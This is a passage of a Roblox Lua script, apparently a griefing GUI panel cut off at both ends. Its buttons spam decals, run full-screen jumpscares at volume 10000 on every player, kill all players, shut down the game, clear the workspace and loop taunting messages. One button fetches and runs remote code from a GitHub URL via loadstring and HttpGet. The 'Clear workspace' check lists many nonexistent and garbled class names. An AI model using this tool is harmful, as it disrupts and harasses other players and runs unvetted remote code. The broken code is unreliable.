ocn50.PlaceholderColor3 = Color3.fromRGB(190, 190, 190)
ocn50.Visible = false

oppage = Instance.new("Frame")
oppage.Parent = Others
oppage.Name = "oppage"
oppage.Size = UDim2.new(0, 645, 0, 35)
oppage.Position = UDim2.new(0.00720000034, 0, 0, 0)
oppage.BackgroundColor3 = Color3.new(0, 0, 0)
oppage.BorderColor3 = Color3.new(255, 0, 0)
oppage.BorderSizePixel = 2

destruct = Instance.new("TextButton")
destruct.Parent = oppage
destruct.Text = ">"
destruct.TextScaled = true
destruct.TextColor3 = Color3.new(0, 0, 1)
destruct.Size = UDim2.new(0, 50, 0, 35)
destruct.Position = UDim2.new(0, 590, 0, 0)
destruct.BorderColor3 = Color3.new(1, 0, 0)
destruct.BorderSizePixel = 2
destruct.BackgroundColor3 = Color3.new(0, 0, 0)
destruct.BackgroundTransparency = 0.5
destruct.Visible = true

destruct2 = Instance.new("TextButton")
destruct2.Parent = oppage
destruct2.Text = "<"
destruct2.TextScaled = true
destruct2.TextColor3 = Color3.new(0, 0, 1)
destruct2.Size = UDim2.new(0, 50, 0, 35)
destruct2.Position = UDim2.new(0, 5, 0, 0)
destruct2.BorderColor3 = Color3.new(1, 0, 0)
destruct2.BorderSizePixel = 2
destruct2.BackgroundColor3 = Color3.new(0, 0, 0)
destruct2.BackgroundTransparency = 0.5
destruct2.Visible = false

mysc = Instance.new("TextLabel")
mysc.Parent = oppage
mysc.Name = "mysc"
mysc.Size = UDim2.new(1, 0, 1.1, 0)
mysc.Position = UDim2.new(0, 0, 0, 0)
mysc.BackgroundColor3 = Color3.new(0, 0, 0)
mysc.BackgroundTransparency = 1
mysc.BorderColor3 = Color3.new(0, 0, 0)
mysc.BorderSizePixel = 1
mysc.TextColor3 = Color3.new(1, 1, 1)
mysc.TextScaled = true
mysc.Font = Enum.Font.SourceSansBold
mysc.Text = "Other Scripts"
mysc.TextXAlignment = Enum.TextXAlignment.Center
mysc.TextYAlignment = Enum.TextYAlignment.Center

nextmy = Instance.new("TextButton")
nextmy.Parent = Others
nextmy.Name = "nextmy"
nextmy.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
nextmy.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
nextmy.BackgroundColor3 = Color3.new(0, 0, 0)
nextmy.BorderColor3 = Color3.new(1, 0, 0)
nextmy.BorderSizePixel = 2
nextmy.TextColor3 = Color3.new(1, 1, 1)
nextmy.TextScaled = true
nextmy.Font = Enum.Font.GothamBold
nextmy.Text = ">"
nextmy.Visible = true

backmy = Instance.new("TextButton")
backmy.Parent = Others
backmy.Name = "backmy"
backmy.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
backmy.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
backmy.BackgroundColor3 = Color3.new(0, 0, 0)
backmy.BorderColor3 = Color3.new(1, 0, 0)
backmy.BorderSizePixel = 2
backmy.TextColor3 = Color3.new(1, 1, 1)
backmy.TextScaled = true
backmy.Font = Enum.Font.GothamBold
backmy.Text = "<"
backmy.Visible = false

nem = Instance.new("TextButton")
nem.Parent = Others
nem.Name = "nem"
nem.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
nem.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
nem.BackgroundColor3 = Color3.new(0, 0, 0)
nem.BorderColor3 = Color3.new(1, 0, 0)
nem.BorderSizePixel = 2
nem.TextColor3 = Color3.new(1, 1, 1)
nem.TextScaled = true
nem.Font = Enum.Font.GothamBold
nem.Text = ">"
nem.Visible = false

bem = Instance.new("TextButton")
bem.Parent = Others
bem.Name = "bem"
bem.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
bem.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
bem.BackgroundColor3 = Color3.new(0, 0, 0)
bem.BorderColor3 = Color3.new(1, 0, 0)
bem.BorderSizePixel = 2
bem.TextColor3 = Color3.new(1, 1, 1)
bem.TextScaled = true
bem.Font = Enum.Font.GothamBold
bem.Text = "<"
bem.Visible = false

nem2 = Instance.new("TextButton")
nem2.Parent = Others
nem2.Name = "nem"
nem2.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
nem2.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
nem2.BackgroundColor3 = Color3.new(0, 0, 0)
nem2.BorderColor3 = Color3.new(1, 0, 0)
nem2.BorderSizePixel = 2
nem2.TextColor3 = Color3.new(1, 1, 1)
nem2.TextScaled = true
nem2.Font = Enum.Font.GothamBold
nem2.Text = ">"
nem2.Visible = false

bem2 = Instance.new("TextButton")
bem2.Parent = Others
bem2.Name = "bem"
bem2.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
bem2.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
bem2.BackgroundColor3 = Color3.new(0, 0, 0)
bem2.BorderColor3 = Color3.new(1, 0, 0)
bem2.BorderSizePixel = 2
bem2.TextColor3 = Color3.new(1, 1, 1)
bem2.TextScaled = true
bem2.Font = Enum.Font.GothamBold
bem2.Text = "<"
bem2.Visible = false

 mypages = Instance.new("TextLabel")
mypages.Parent = Others
mypages.Name = "mypages"
mypages.Size = UDim2.new(0.150000006, 0, 0.0799999982, 0)
mypages.Position = UDim2.new(0.429999977, 0, 0.921000004, 0)
mypages.BackgroundColor3 = Color3.new(0, 0, 0)
mypages.BackgroundTransparency = 0
mypages.BorderColor3 = Color3.new(1, 0, 0)
mypages.BorderSizePixel = 2
mypages.TextColor3 = Color3.new(1, 1, 1)
mypages.TextScaled = true
mypages.Text = "Page 1"
mypages.TextXAlignment = Enum.TextXAlignment.Center
mypages.TextYAlignment = Enum.TextYAlignment.Center

ocnf1 = Instance.new("TextButton")
ocnf1.Parent = Others
ocnf1.Name = "ocnf1"
ocnf1.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf1.Position = UDim2.new(0.00996587239, 0, 0.150, 0)
ocnf1.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf1.BorderColor3 = Color3.new(1, 0, 0)
ocnf1.BorderSizePixel = 3
ocnf1.TextColor3 = Color3.new(1, 1, 1)
ocnf1.TextScaled = true
ocnf1.Font = Enum.Font.Roboto
ocnf1.Text = "Decal Spam 1"
ocnf1.Visible = false
ocnf1.MouseButton1Click:Connect(function()
	local dec1 = "rbxassetid://104614450687849"
	local dec2 = "rbxassetid://104614450687849"
	local dec3 = "rbxassetid://104614450687849"
	local dec4 = "rbxassetid://104614450687849"

	local w = workspace:GetDescendants()

	local texture = "rbxassetid://104614450687849"

	local parts = {}
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Part") then
			table.insert(parts, descendant)
		end
	end

	for _, part in pairs(parts) do
		local td = Instance.new("Decal", part)
		td.Face = Enum.NormalId.Top
		td.Texture = texture

		local fd = Instance.new("Decal", part)
		fd.Face = Enum.NormalId.Front
		fd.Texture = texture

		local bd = Instance.new("Decal", part)
		bd.Face = Enum.NormalId.Back
		bd.Texture = texture

		local ld = Instance.new("Decal", part)
		ld.Face = Enum.NormalId.Left
		ld.Texture = texture

		local btd = Instance.new("Decal", part)
		btd.Face = Enum.NormalId.Bottom
		btd.Texture = texture

		local rd = Instance.new("Decal", part)
		rd.Face = Enum.NormalId.Right
		rd.Texture = texture
	end
end)

ocnf2 = Instance.new("TextButton")
ocnf2.Parent = Others
ocnf2.Name = "ocnf2"
ocnf2.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf2.Position = UDim2.new(0.18, 0, 0.150, 0)
ocnf2.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf2.BorderColor3 = Color3.new(1, 0, 0)
ocnf2.BorderSizePixel = 3
ocnf2.TextColor3 = Color3.new(1, 1, 1)
ocnf2.TextScaled = true
ocnf2.Font = Enum.Font.Roboto
ocnf2.Text = "Skybox 1"
ocnf2.Visible = false
ocnf2.MouseButton1Click:Connect(function()
    if not game or not game.Lighting then return end 

    assetId = 104614450687849 
    skyboxUrl = "rbxassetid://" .. assetId

    for _, v in pairs(game.Lighting:GetChildren()) do
        if v:IsA("Sky") then
            v:Destroy()
        end
    end

    
    sky = Instance.new("Sky")
    sky.Parent = game.Lighting

    
    sky.SkyboxBk = skyboxUrl
    sky.SkyboxDn = skyboxUrl
    sky.SkyboxFt = skyboxUrl
    sky.SkyboxLf = skyboxUrl
    sky.SkyboxRt = skyboxUrl
    sky.SkyboxUp = skyboxUrl
end)

ocnf3 = Instance.new("TextButton")
ocnf3.Parent = Others
ocnf3.Name = "ocnf3"
ocnf3.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf3.Position = UDim2.new(0.35, 0, 0.150, 0)
ocnf3.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf3.BorderColor3 = Color3.new(1, 0, 0)
ocnf3.BorderSizePixel = 3
ocnf3.TextColor3 = Color3.new(1, 1, 1)
ocnf3.TextScaled = true
ocnf3.Font = Enum.Font.Roboto
ocnf3.Text = "Jumpscare 1"
ocnf3.Visible = false
ocnf3.MouseButton1Click:Connect(function()
	for i, v in pairs(game.Players:GetPlayers()) do
		if v:FindFirstChild("PlayerGui") then
			spawn(function()
				local newgui = Instance.new("ScreenGui", v.PlayerGui)
				newgui.Name = "Screamer"
				newgui.IgnoreGuiInset = true

				local newimage = Instance.new("ImageLabel", newgui)
				newimage.Image = "rbxassetid://93872433943548"
				newimage.Size = UDim2.new(1, 0, 1, 0)
				newimage.Position = UDim2.new(0, 0, 0, 0)
				newimage.AnchorPoint = Vector2.new(0, 0)
				local s = Instance.new("Sound", newgui)
				s.SoundId = "rbxassetid://9072304992" --9018233362
				s.Volume = 10000
				s.Looped = true
				s:Play()
				print("Screamed " .. v.Name)
				wait(7)
				if newgui and newgui.Parent then
					newgui:Destroy()
				end
			end)
		end
	end
end)

ocnf4 = Instance.new("TextButton")
ocnf4.Parent = Others
ocnf4.Name = "ocnf4"
ocnf4.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf4.Position = UDim2.new(0.52, 0, 0.150, 0)
ocnf4.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf4.BorderColor3 = Color3.new(1, 0, 0)
ocnf4.BorderSizePixel = 3
ocnf4.TextColor3 = Color3.new(1, 1, 1)
ocnf4.TextScaled = true
ocnf4.Font = Enum.Font.Roboto
ocnf4.Text = "Theme 1"
ocnf4.Visible = false
ocnf4.MouseButton1Click:Connect(function()
local sound = Instance.new("Sound")
sound.Parent = workspace

sound.SoundId = "rbxassetid://98439648086561"
sound.Volume = 5
sound.Looped = true
    sound:Play()
end)

ocnf5 = Instance.new("TextButton")
ocnf5.Parent = Others
ocnf5.Name = "ocnf5"
ocnf5.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf5.Position = UDim2.new(0.69, 0, 0.150, 0)
ocnf5.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf5.BorderColor3 = Color3.new(1, 0, 0)
ocnf5.BorderSizePixel = 3
ocnf5.TextColor3 = Color3.new(1, 1, 1)
ocnf5.TextScaled = true
ocnf5.Font = Enum.Font.Roboto
ocnf5.Text = "Decal Spam 2"
ocnf5.Visible = false
ocnf5.MouseButton1Click:Connect(function()
	local dec1 = "rbxassetid://114070753826630"
	local dec2 = "rbxassetid://114070753826630"
	local dec3 = "rbxassetid://114070753826630"
	local dec4 = "rbxassetid://114070753826630"

	local w = workspace:GetDescendants()

	local texture = "rbxassetid://114070753826630"

	local parts = {}
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Part") then
			table.insert(parts, descendant)
		end
	end

	for _, part in pairs(parts) do
		local td = Instance.new("Decal", part)
		td.Face = Enum.NormalId.Top
		td.Texture = texture

		local fd = Instance.new("Decal", part)
		fd.Face = Enum.NormalId.Front
		fd.Texture = texture

		local bd = Instance.new("Decal", part)
		bd.Face = Enum.NormalId.Back
		bd.Texture = texture

		local ld = Instance.new("Decal", part)
		ld.Face = Enum.NormalId.Left
		ld.Texture = texture

		local btd = Instance.new("Decal", part)
		btd.Face = Enum.NormalId.Bottom
		btd.Texture = texture

		local rd = Instance.new("Decal", part)
		rd.Face = Enum.NormalId.Right
		rd.Texture = texture
	end
end)

ocnf6 = Instance.new("TextButton")
ocnf6.Parent = Others
ocnf6.Name = "ocnf6"
ocnf6.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnf6.Position = UDim2.new(0.86, 0, 0.150, 0)
ocnf6.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf6.BorderColor3 = Color3.new(1, 0, 0)
ocnf6.BorderSizePixel = 3
ocnf6.TextColor3 = Color3.new(1, 1, 1)
ocnf6.TextScaled = true
ocnf6.Font = Enum.Font.Roboto
ocnf6.Text = "Skybox 2"
ocnf6.Visible = false
ocnf6.MouseButton1Click:Connect(function()
    if not game or not game.Lighting then return end 

    assetId = 114070753826630 
    skyboxUrl = "rbxassetid://" .. assetId

    
    for _, v in pairs(game.Lighting:GetChildren()) do
        if v:IsA("Sky") then
            v:Destroy()
        end
    end

    
    sky = Instance.new("Sky")
    sky.Parent = game.Lighting

    
    sky.SkyboxBk = skyboxUrl
    sky.SkyboxDn = skyboxUrl
    sky.SkyboxFt = skyboxUrl
    sky.SkyboxLf = skyboxUrl
    sky.SkyboxRt = skyboxUrl
    sky.SkyboxUp = skyboxUrl
end)

ocnf7 = Instance.new("TextButton")
ocnf7.Parent = Others
ocnf7.Name = "ocnf7"
ocnf7.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf7.Position = UDim2.new(0.00996587239, 0, 0.350, 0)
ocnf7.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf7.BorderColor3 = Color3.new(1, 0, 0)
ocnf7.BorderSizePixel = 3
ocnf7.TextColor3 = Color3.new(1, 1, 1)
ocnf7.TextScaled = true
ocnf7.Font = Enum.Font.Roboto
ocnf7.Text = "Jumpscare 2"
ocnf7.Visible = false
ocnf7.MouseButton1Click:Connect(function()
	for i, v in pairs(game.Players:GetPlayers()) do
		if v:FindFirstChild("PlayerGui") then
			spawn(function()
				local newgui = Instance.new("ScreenGui", v.PlayerGui)
				newgui.Name = "Screamer"
				newgui.IgnoreGuiInset = true

				local newimage = Instance.new("ImageLabel", newgui)
				newimage.Image = "rbxassetid://107978443801641"
				newimage.Size = UDim2.new(1, 0, 1, 0)
				newimage.Position = UDim2.new(0, 0, 0, 0)
				newimage.AnchorPoint = Vector2.new(0, 0)
				local s = Instance.new("Sound", newgui)
				s.SoundId = "rbxassetid://6129291390" --9018233362
				s.Volume = 10000
				s.Looped = true
				s:Play()
				print("Screamed " .. v.Name)
				wait(9)
				if newgui and newgui.Parent then
					newgui:Destroy()
				end
			end)
		end
	end
end)

ocnf8 = Instance.new("TextButton")
ocnf8.Parent = Others
ocnf8.Name = "ocnf8"
ocnf8.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf8.Position = UDim2.new(0.18, 0, 0.350, 0)
ocnf8.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf8.BorderColor3 = Color3.new(1, 0, 0)
ocnf8.BorderSizePixel = 3
ocnf8.TextColor3 = Color3.new(1, 1, 1)
ocnf8.TextScaled = true
ocnf8.Font = Enum.Font.Roboto
ocnf8.Text = "Theme 2"
ocnf8.Visible = false
ocnf8.MouseButton1Click:Connect(function()
local sound = Instance.new("Sound")
sound.Parent = workspace

sound.SoundId = "rbxassetid://104181508980428"
sound.Volume = 5
sound.Looped = true
sound.Pitch = 0.180
    sound:Play()
end)

ocnf9 = Instance.new("TextButton")
ocnf9.Parent = Others
ocnf9.Name = "ocnf9"
ocnf9.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf9.Position = UDim2.new(0.35, 0, 0.350, 0)
ocnf9.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf9.BorderColor3 = Color3.new(1, 0, 0)
ocnf9.BorderSizePixel = 3
ocnf9.TextColor3 = Color3.new(1, 1, 1)
ocnf9.TextScaled = true
ocnf9.Font = Enum.Font.Roboto
ocnf9.Text = "Rainbow Path"
ocnf9.Visible = false
ocnf9.MouseButton1Click:Connect(function()
Player = game:getService("Players").LocalPlayer
Character = Player.Character
Model = Instance.new("Model",Character)
P = Instance.new("Part")
P.Anchored = true
P.Locked = true
P.CanCollide = true
P.Reflectance = 0.1
P.formFactor = "Custom"
P.Size = Vector3.new(10,0.5,10)
P.TopSurface = 0
P.BottomSurface = 0
M = Instance.new("CylinderMesh",P)
C1 = true
while true do wait()
P2 = P:Clone()
if C1 then
P2.BrickColor = BrickColor.new("White")
C1 = false
elseif not C1 then
P2.BrickColor = BrickColor.new("Really black")
C1 = true
end
P2.Color = Color3.new(math.random(),math.random(),math.random())
P2.Parent = Model
P2.CFrame = Character.Torso.CFrame - Vector3.new(0,3.2,0)
for i,v in pairs(Model:GetChildren()) do
if v:IsA("Part") then
else
v:Remove()
end
end
end
end)

ocnf10 = Instance.new("TextButton")
ocnf10.Parent = Others
ocnf10.Name = "ocnf10"
ocnf10.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf10.Position = UDim2.new(0.52, 0, 0.350, 0)
ocnf10.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf10.BorderColor3 = Color3.new(1, 0, 0)
ocnf10.BorderSizePixel = 3
ocnf10.TextColor3 = Color3.new(1, 1, 1)
ocnf10.TextScaled = true
ocnf10.Font = Enum.Font.Roboto
ocnf10.Text = "c00lGui"
ocnf10.Visible = false
ocnf10.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/C00lguiz/refs/heads/main/%5BGUI%5D%20c00lgui.txt"))()
end)

ocnf11 = Instance.new("TextButton")
ocnf11.Parent = Others
ocnf11.Name = "ocnf11"
ocnf11.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf11.Position = UDim2.new(0.69, 0, 0.350, 0)
ocnf11.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf11.BorderColor3 = Color3.new(1, 0, 0)
ocnf11.BorderSizePixel = 3
ocnf11.TextColor3 = Color3.new(1, 1, 1)
ocnf11.TextScaled = true
ocnf11.Font = Enum.Font.Roboto
ocnf11.Text = "Shutdown"
ocnf11.Visible = false
ocnf11.MouseButton1Click:Connect(function()
game:Shutdown()
end)

ocnf12 = Instance.new("TextButton")
ocnf12.Parent = Others
ocnf12.Name = "ocnf12"
ocnf12.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnf12.Position = UDim2.new(0.86, 0, 0.350, 0)
ocnf12.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf12.BorderColor3 = Color3.new(1, 0, 0)
ocnf12.BorderSizePixel = 3
ocnf12.TextColor3 = Color3.new(1, 1, 1)
ocnf12.TextScaled = true
ocnf12.Font = Enum.Font.Roboto
ocnf12.Text = "Hint 1"
ocnf12.Visible = false
ocnf12.MouseButton1Click:Connect(function()
local hints = {
    "1x98n6ex6 Join Dah Gamez!?!?!",
    "This Server is Fucked Up!!!.",
    "No time to get out of the Gamez!!!!",
    "Have fun playing!. With 1x98n6ex6!",
    "Die Noobs!"
}

local hintDisplayTime = 4
local hintObject = Instance.new("Hint")
hintObject.Parent = game.Workspace

local currentIndex = 1

while true do
    hintObject.Text = hints[currentIndex]
    wait(hintDisplayTime)
    currentIndex = currentIndex + 1
    if currentIndex > #hints then
        currentIndex = 1
    end
end
end)

ocnf13 = Instance.new("TextButton")
ocnf13.Parent = Others
ocnf13.Name = "ocnf13"
ocnf13.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf13.Position = UDim2.new(0.00996587239, 0, 0.550, 0)
ocnf13.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf13.BorderColor3 = Color3.new(1, 0, 0)
ocnf13.BorderSizePixel = 3
ocnf13.TextColor3 = Color3.new(1, 1, 1)
ocnf13.TextScaled = true
ocnf13.Font = Enum.Font.Roboto
ocnf13.Text = "Message 1"
ocnf13.Visible = false
ocnf13.MouseButton1Click:Connect(function()
msg = Instance.new("Message")
msg.Parent = game.Workspace
msg.Text = "1x98n6ex6 is here!. You can't do anything!" 
wait(4)
msg.Text = "1x98n6ex6 will take over the gamez!?!?!" 
wait(4)
msg.Text = "1x98n6ex6 is Dominating The Gamez?!?!?!!!!" 
wait(5)
msg:Remove()
end)

ocnf14 = Instance.new("TextButton")
ocnf14.Parent = Others
ocnf14.Name = "ocnf14"
ocnf14.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf14.Position = UDim2.new(0.18, 0, 0.550, 0)
ocnf14.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf14.BorderColor3 = Color3.new(1, 0, 0)
ocnf14.BorderSizePixel = 3
ocnf14.TextColor3 = Color3.new(1, 1, 1)
ocnf14.TextScaled = true
ocnf14.Font = Enum.Font.Roboto
ocnf14.Text = "Obunga Jumpscare"
ocnf14.Visible = false

ocnf15 = Instance.new("TextButton")
ocnf15.Parent = Others
ocnf15.Name = "ocnf15"
ocnf15.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf15.Position = UDim2.new(0.35, 0, 0.550, 0)
ocnf15.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf15.BorderColor3 = Color3.new(1, 0, 0)
ocnf15.BorderSizePixel = 3
ocnf15.TextColor3 = Color3.new(1, 1, 1)
ocnf15.TextScaled = true
ocnf15.Font = Enum.Font.Roboto
ocnf15.Text = "Kill all"
ocnf15.Visible = false
ocnf15.MouseButton1Click:Connect(function()
  function killAndBreak(plry)
    if plry == 'all' then
      for _, plr in pairs(game.Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
          local humanoid = plr.Character:FindFirstChild("Humanoid")
          humanoid.Health = 0

          for _, part in pairs(plr.Character:GetDescendants()) do
            if part:IsA("JointInstance") then
              part:Destroy()
            end
          end
        end
      end
    elseif plry == 'others' then
      for _, plr in pairs(game.Players:GetPlayers()) do
        if plr ~= game.Players.LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") then
          local humanoid = plr.Character:FindFirstChild("Humanoid")
          humanoid.Health = 0

          for _, part in pairs(plr.Character:GetDescendants()) do
            if part:IsA("JointInstance") then
              part:Destroy()
            end
          end
        end
      end
    else
      local plr = game.Players:FindFirstChild(plry)
      if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
        local humanoid = plr.Character:FindFirstChild("Humanoid")
        humanoid.Health = 0

        for _, part in pairs(plr.Character:GetDescendants()) do
          if part:IsA("JointInstance") then
            part:Destroy()
          end
        end
      end
    end
  end

  killAndBreak('all')
end)

ocnf16 = Instance.new("TextButton")
ocnf16.Parent = Others
ocnf16.Name = "ocnf16"
ocnf16.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf16.Position = UDim2.new(0.52, 0, 0.550, 0)
ocnf16.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf16.BorderColor3 = Color3.new(1, 0, 0)
ocnf16.BorderSizePixel = 3
ocnf16.TextColor3 = Color3.new(1, 1, 1)
ocnf16.TextScaled = true
ocnf16.Font = Enum.Font.Roboto
ocnf16.Text = "Particles 1"
ocnf16.Visible = false
ocnf16.MouseButton1Click:Connect(function()
    local function applyParticleEffect(part)
        if part:IsA("BasePart") then
            local pe = Instance.new("ParticleEmitter", part)
            pe.Texture = "rbxassetid://93872433943548"
            pe.VelocitySpread = 50
            pe.Lifetime = NumberRange.new(1, 5)
            pe.Rate = 25
            pe.Speed = NumberRange.new(10, 20)
            pe.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1.2), NumberSequenceKeypoint.new(1, 0)})

            local se = Instance.new("ParticleEmitter", part)
            se.Texture = "rbxassetid://93872433943548"
            se.VelocitySpread = 50
            se.Lifetime = NumberRange.new(1.5, 5.5)
            se.Rate = 20
            se.Speed = NumberRange.new(15, 25)
            se.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0)})

            local fe = Instance.new("ParticleEmitter", part)
            fe.Texture = "rbxassetid://93872433943548"
            fe.VelocitySpread = 50
            fe.Lifetime = NumberRange.new(2, 5)
            fe.Rate = 15
            fe.Speed = NumberRange.new(20, 30)
            fe.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.8), NumberSequenceKeypoint.new(1, 0)})
        end
    end

    local function processInstance(instance)
        if instance:IsA("BasePart") then
            applyParticleEffect(instance)
        end

        for _, child in pairs(instance:GetChildren()) do
            processInstance(child)
        end
    end

    processInstance(game.Workspace)
end)

ocnf17 = Instance.new("TextButton")
ocnf17.Parent = Others
ocnf17.Name = "ocnf17"
ocnf17.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf17.Position = UDim2.new(0.69, 0, 0.550, 0)
ocnf17.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf17.BorderColor3 = Color3.new(1, 0, 0)
ocnf17.BorderSizePixel = 3
ocnf17.TextColor3 = Color3.new(1, 1, 1)
ocnf17.TextScaled = true
ocnf17.Font = Enum.Font.Roboto
ocnf17.Text = "Disco"
ocnf17.Visible = false
ocnf17.MouseButton1Click:Connect(function()

local function getRandomRGB()
    local red = math.random()
    local green = math.random()
    local blue = math.random()
    return Color3.new(red, green, blue)
end

local function updateColors()
    local randomColor = getRandomRGB()

    lighting.FogColor = randomColor

    lighting.FogStart = 5
    lighting.FogEnd = 20

end

while true do
    updateColors()
    wait(0.5)

		game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
		wait(.25)
end
end)

ocnf18 = Instance.new("TextButton")
ocnf18.Parent = Others
ocnf18.Name = "ocnf18"
ocnf18.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnf18.Position = UDim2.new(0.86, 0, 0.550, 0)
ocnf18.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf18.BorderColor3 = Color3.new(1, 0, 0)
ocnf18.BorderSizePixel = 3
ocnf18.TextColor3 = Color3.new(1, 1, 1)
ocnf18.TextScaled = true
ocnf18.Font = Enum.Font.Roboto
ocnf18.Text = "Clear workspace"
ocnf18.Visible = false
ocnf18.MouseButton1Click:Connect(function()
for i, object in pairs(workspace:GetChildren()) do
    
    if object:IsA("BasePart") or object:IsA("Model") or object:IsA("Folder") or object:IsA("Accoutrement") or object:IsA("Attachment") or object:IsA("Beam") or object:IsA("BillboardGui") or object:IsA("BlurEffect") or object:IsA("BoolValue") or object:IsA("BrickColorValue") or object:IsA("Camera") or object:IsA("CanvasGroup") or object:IsA("CFrameValue") or object:IsA("CharacterMesh") or object:IsA("Color3Value") or object:IsA("Configuration") or object:IsA("ConeHandleAdornment") or object:IsA("CurveController") or object:IsA("Decal") or object:IsA("DepthOfFieldEffect") or object:IsA("DetailController") or object:IsA("Dialog") or object:IsA("DialogChoice") or object:IsA("DoubleConstrainedHandle") or object:IsA("DragDetector") or object:IsA("DrawInstance") or object:IsA("Effect") or object:IsA("Explosion") or object:IsA("FloatCurve") or object:IsA("FloatValue") or object:IsA("FogEffect") or object:IsA("ForceField") or object:IsA("Frame") or object:IsA("FreeformBillboardGui") or object:IsA("FunctionalTest") or object:IsA("GeometryInstance") or object:IsA("GlobalSettings") or object:IsA("GraphicController") or object:IsA("GuiBase2d") or object:IsA("GuiBase3d") or object:IsA("GuiButton") or object:IsA("GuiLabel") or object:IsA("GuiObject") or object:IsA("GuiPage") or object:IsA("HandleAdornment") or object:IsA("HingeConstraint") or object:IsA(" ஹோலோgram") or object:IsA("ImageButton") or object:IsA("ImageLabel") or object:IsA("ImpreciseFloatValue") or object:IsA("InsertService") or object:IsA("IntConstrainedHandle") or object:IsA("IntValue") or object:IsA("Light") or object:IsA("LineHandleAdornment") or object:IsA("LocalScript") or object:IsA("LuaSourceContainer") or object:IsA("MaterialService") or object:IsA("Message") or object:IsA("MeshPart") or object:IsA("ModelAdornment") or object:IsA("ModuleScript") or object:IsA("Motor") or object:IsA("Motor6D") or object:IsA("Mouse") or object:IsA("NumberRange") or object:IsA("ObjectValue") or object:IsA("PackageLink") or object:IsA("PartAdornment") or object:IsA("ParticleEmitter") or object:IsA("Plane") or object:IsA("PlaneAdornment") or object:IsA("PointLight") or object:IsA("PointsService") or object:IsA("PolygonDraw") or object:IsA("RayValue") or object:IsA("ReflectionMetadata") or object:IsA("RemoteEvent") or object:IsA("RemoteFunction") or object:IsA("RenderSettings") or object:IsA("ReverbSoundEffect") or object:IsA("RopeConstraint") or object:IsA("Rotate") or object:IsA("RunService") or object:IsA("ScreenGui") or object:IsA("Script") or object:IsA("SelectionBox") or object:IsA("SelectionGroup") or object:IsA("ServerScript") or object:IsA("ServerStorage") or object:IsA("Service") or object:IsA("Settings") or object:IsA("Shape") or object:IsA("Shirt") or object:IsA("ShirtGraphic") or object:IsA("SkinnedMesh") or object:IsA("Sky") or object:IsA("Smoke") or object:IsA("Sound") or object:IsA("SoundEffect") or object:IsA("SpawnLocation") or object:IsA(" স্প্রাইট") or object:IsA("StringValue") or object:IsA("SurfaceAppearance") or object:IsA("SurfaceGui") or object:IsA("TextButton") or object:IsA("TextBox") or object:IsA("TextLabel") or object:IsA("TextService") or object:IsA("Texture") or object:IsA("TextureLabel") or object:IsA("TextureButton") or object:IsA("TimerService") or object:IsA("Tool") or object:IsA("TouchGui") or object:IsA("Trail") or object:IsA("Transform") or object:IsA("Translator") or object:IsA("Transparency") or object:IsA("TrussPart") or object:IsA("UIAspectRatioConstraint") or object:IsA("UICorner") or object:IsA("UIGradient") or object:IsA("UIGridLayout") or object:IsA("UIImage") or object:IsA("UILayout") or object:IsA("UIListLayout") or object:IsA("UIPadding") or object:IsA("UIPageLayout") or object:IsA("UIRectangleCorner") or object:IsA("UIScale") or object:IsA("UISizeConstraint") or 